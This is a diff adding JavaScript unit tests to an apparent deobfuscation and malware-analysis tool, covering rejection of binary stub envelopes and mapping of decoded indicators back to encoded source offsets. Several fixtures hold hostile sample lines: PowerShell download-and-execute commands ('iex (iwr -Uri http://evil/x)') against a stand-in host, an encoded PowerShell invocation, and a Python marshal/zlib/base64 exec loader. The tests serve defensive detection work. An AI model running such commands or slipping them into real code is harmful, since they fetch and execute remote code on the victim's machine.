@@ -536,3 +536,208 @@ test('analyze() passes formatTag=decoded-payload to the worker', async () => {
   assert.equal(wm._calls[0].opts.formatTag, 'decoded-payload');
   assert.equal(wm._calls[0].payloadCount, 1);
 });
+
+// ══════════════════════════════════════════════════════════════════════════
+// Binary-stub rejection — reported regression
+// ══════════════════════════════════════════════════════════════════════════
+//
+// `python-obfuscation.js` and `php-obfuscation.js` stamp non-printable
+// decoded bytes with a human-readable envelope like
+// `<binary 45B (likely marshal/pickle): 789c…>` on
+// `_deobfuscatedText`. These envelopes are analyst breadcrumbs, NOT
+// actual script source — splicing them into the reconstructed body
+// produced nonsense lines when the detector had a marshal/pickle blob
+// as the deepest decoded "text" (the user's python-obfuscation-suite.py
+// regression report). `_pickDeepestTextNode` must treat such envelopes
+// as "no usable text" so the finding either contributes a deeper real
+// decode or drops out of the reassembly entirely.
+
+test('_pickDeepestTextNode rejects <binary …B…> stub as _deobfuscatedText', () => {
+  const f = mkFinding({
+    encoding: 'Python Base64 ↦ zlib',
+    _deobfuscatedText: '<binary 45B (likely marshal/pickle): 789c2b4a2dce2f5248cecf…>',
+  });
+  const pick = _pickDeepestTextNode(f);
+  assert.equal(pick, null, 'a stub-only finding must not produce a splice candidate');
+});
+
+test('_pickDeepestTextNode rejects <binary …B> stub (plain variant)', () => {
+  const f = mkFinding({
+    encoding: 'Python hex ↦ bytes',
+    _deobfuscatedText: '<binary 128B: 4d5a9000030000000400…>',
+  });
+  const pick = _pickDeepestTextNode(f);
+  assert.equal(pick, null);
+});
+
+test('_pickDeepestTextNode prefers deeper real text over a stub parent', () => {
+  // A Python finding whose outer layer is a marshal-stub envelope but
+  // whose inner decoding produced real PowerShell. The walk must pick
+  // the deeper real text, not bail at the stub.
+  const f = mkFinding({
+    encoding: 'Python Base64 ↦ zlib',
+    _deobfuscatedText: '<binary 45B (likely marshal/pickle): 789c…>',
+    innerFindings: [mkFinding({
+      encoding: 'PowerShell',
+      _deobfuscatedText: 'Invoke-Expression (iwr -Uri http://evil/s)',
+    })],
+  });
+  const pick = _pickDeepestTextNode(f);
+  assert.ok(pick, 'deeper real text must still produce a pick');
+  assert.match(pick.text, /Invoke-Expression/);
+});
+
+test('build() drops a stub-only finding so reconstruction does not splice the envelope text', () => {
+  const source = 'line1\nimport marshal,zlib,base64;exec(marshal.loads(zlib.decompress(base64.b64decode(b"…"))))\n';
+  const f = mkFinding({
+    offset: 6,
+    length: 90,
+    encoding: 'Python Base64 ↦ zlib',
+    severity: 'high',
+    _deobfuscatedText: '<binary 45B (likely marshal/pickle): 789c2b4a2dce2f5248cecf…>',
+    iocs: [{ type: 'url', value: 'x' }],   // pass mode gate
+  });
+  const out = build(source, [f], { mode: 'auto' });
+  // Either skipped entirely (zero eligible candidates) or stitched
+  // without the envelope in its reconstructed text. The whole point
+  // of the fix is that the envelope never appears in `text`.
+  if (out && out.text) {
+    assert.doesNotMatch(out.text, /<binary\s+\d+B/);
+    assert.doesNotMatch(out.text, /<marshal payload/);
+  } else {
+    assert.match(out.skipReason || '', /too-few-findings|no-findings/);
+  }
+});
+
+// ══════════════════════════════════════════════════════════════════════════
+// Reassembly IOC source-offset mapping — reported regression
+// ══════════════════════════════════════════════════════════════════════════
+//
+// Reassembly-derived novel IOCs must carry `_sourceOffset` /
+// `_sourceLength` that point at the ENCODED source region that
+// produced the decoded bytes. Without this, the sidebar's click-to-
+// focus handler fell back to a verbatim substring search in
+// `_rawText` and either found nothing or landed on an unrelated
+// plaintext occurrence (the user's "highlights the wrong part of the
+// content" regression).
+
+const { mapStrippedToSource } = EncodedReassembler;
+
+test('mapStrippedToSource maps a stripped offset inside a verbatim span to the source + delta', () => {
+  // Synthetic reconstruction — one splice at source offsets 10–20,
+  // with verbatim prefix [0–10) and verbatim suffix [20–33).
+  const reconstructed = {
+    sourceMap: [
+      { reconOffset: 0,  sourceOffset: 0,  length: 10, isSplice: false, strippedOffset: 0,  strippedLength: 10 },
+      { reconOffset: 10, sourceOffset: 10, length: 10, isSplice: true,  sourceLength: 10, strippedOffset: 10, strippedLength: 15 },
+      { reconOffset: 35, sourceOffset: 20, length: 13, isSplice: false, strippedOffset: 25, strippedLength: 13 },
+    ],
+  };
+  // Stripped offset 3 lives inside the verbatim prefix.
+  const m = mapStrippedToSource(reconstructed, 3);
+  assert.ok(m, 'must return a mapping');
+  assert.equal(m.isSplice, false);
+  assert.equal(m.sourceOffset, 3);
+});
+
+test('mapStrippedToSource maps a stripped offset inside a splice to the full encoded span', () => {
+  const reconstructed = {
+    sourceMap: [
+      { reconOffset: 0,  sourceOffset: 0,  length: 10, isSplice: false, strippedOffset: 0,  strippedLength: 10 },
+      { reconOffset: 10, sourceOffset: 10, length: 10, isSplice: true,  sourceLength: 10, strippedOffset: 10, strippedLength: 15 },
+    ],
+  };
+  // Stripped offset 17 lives inside the splice (stripped [10..25)).
+  const m = mapStrippedToSource(reconstructed, 17);
+  assert.ok(m);
+  assert.equal(m.isSplice, true);
+  assert.equal(m.sourceOffset, 10, 'decoded IOC maps to the ENCODED span start');
+  assert.equal(m.sourceLength, 10, 'decoded IOC inherits the ENCODED span length');
+});
+
+test('mapStrippedToSource returns null when the offset is past the map', () => {
+  const reconstructed = { sourceMap: [] };
+  assert.equal(mapStrippedToSource(reconstructed, 10), null);
+  assert.equal(mapStrippedToSource(reconstructed, -1), null);
+  assert.equal(mapStrippedToSource(null, 0), null);
+});
+
+test('build() sourceMap entries carry strippedOffset / strippedLength', () => {
+  // A build with one splice + verbatim prefix & suffix must produce a
+  // sourceMap whose strippedOffset fields monotonically increase.
+  const source = 'prefix aaa BIGBADPAYLOAD suffix bbb';
+  const f = mkFinding({
+    offset: 11,
+    length: 13,      // 'BIGBADPAYLOAD'
+    severity: 'high',
+    _deobfuscatedText: 'iex (iwr -Uri http://evil/x)',
+    iocs: [{ type: 'url', value: 'http://evil/x' }],
+  });
+  // Force a second eligible finding so we clear MIN_FINDINGS_USED.
+  const f2 = mkFinding({
+    offset: 31,
+    length: 3,
+    severity: 'high',
+    _deobfuscatedText: 'powershell.exe -enc AA',
+    iocs: [{ type: 'value', value: 'z' }],
+  });
+  const out = build(source, [f, f2], { mode: 'auto', limits: { MIN_COVERAGE: 0, MIN_FINDINGS_USED: 2 } });
+  assert.ok(out && out.sourceMap && out.sourceMap.length >= 2,
+    'build() must return a populated sourceMap');
+  for (const entry of out.sourceMap) {
+    assert.equal(typeof entry.strippedOffset, 'number', 'every entry must have strippedOffset');
+    assert.equal(typeof entry.strippedLength, 'number', 'every entry must have strippedLength');
+    assert.ok(entry.strippedOffset >= 0);
+    assert.ok(entry.strippedLength >= 0);
+  }
+  // Monotonic non-decreasing.
+  for (let i = 1; i < out.sourceMap.length; i++) {
+    assert.ok(
+      out.sourceMap[i].strippedOffset >= out.sourceMap[i - 1].strippedOffset,
+      'strippedOffset must be monotonic non-decreasing'
+    );
+  }
+});
+
+test('analyze() stamps _sourceOffset / _sourceLength / _highlightText / _fromReassembly on novel IOCs', async () => {
+  // Build a minimal reconstruction whose stripped text contains a
+  // recognisable IOC inside a splice. The stub extractor mimics
+  // `extractInterestingStringsCore` — returning a row with `offset` +
+  // `length` + `value` pointing into the stripped text.
+  const source = 'prefix aaa BIGBADPAYLOAD suffix bbb';
+  const f1 = mkFinding({
+    offset: 11, length: 13, severity: 'high',
+    _deobfuscatedText: 'iex (iwr -Uri http://evil/decoded)',
+    iocs: [{ type: 'url', value: 'http://evil/decoded' }],
+  });
+  const f2 = mkFinding({
+    offset: 31, length: 3, severity: 'high',
+    _deobfuscatedText: 'powershell -enc AA',
+    iocs: [{ type: 'value', value: 'z' }],
+  });
+  const reconstructed = build(source, [f1, f2], { mode: 'auto', limits: { MIN_COVERAGE: 0, MIN_FINDINGS_USED: 2 } });
+  assert.ok(reconstructed && reconstructed.text, 'build() must produce a reconstruction');
+
+  const stripped = stripSentinels(reconstructed.text);
+  const needle = 'http://evil/decoded';
+  const needleOffset = stripped.indexOf(needle);
+  assert.ok(needleOffset >= 0, 'needle must appear in the stripped text');
+
+  const out = await analyze(reconstructed, {
+    extractInterestingStringsCore: stubExtract([
+      { value: needle, url: needle, type: 'url', offset: needleOffset, length: needle.length },
+    ]),
+    existingIocs: { allValues: new Set() },
+  });
+
+  assert.equal(out.novelIocs.length, 1);
+  const row = out.novelIocs[0];
+  assert.equal(row._fromReassembly, true);
+  assert.equal(row._reconstructedHash, reconstructed.reconstructedHash);
+  assert.equal(row._highlightText, needle, '_highlightText must be populated for non-plaintext DOM fallbacks');
+  // The needle lives inside the first splice (source [11..24)) so the
+  // map must return that span's offset + length.
+  assert.equal(row._sourceOffset, 11, 'decoded IOC must map to the ENCODED span offset');
+  assert.equal(row._sourceLength, 13, 'decoded IOC must inherit the ENCODED span length');
+});
+
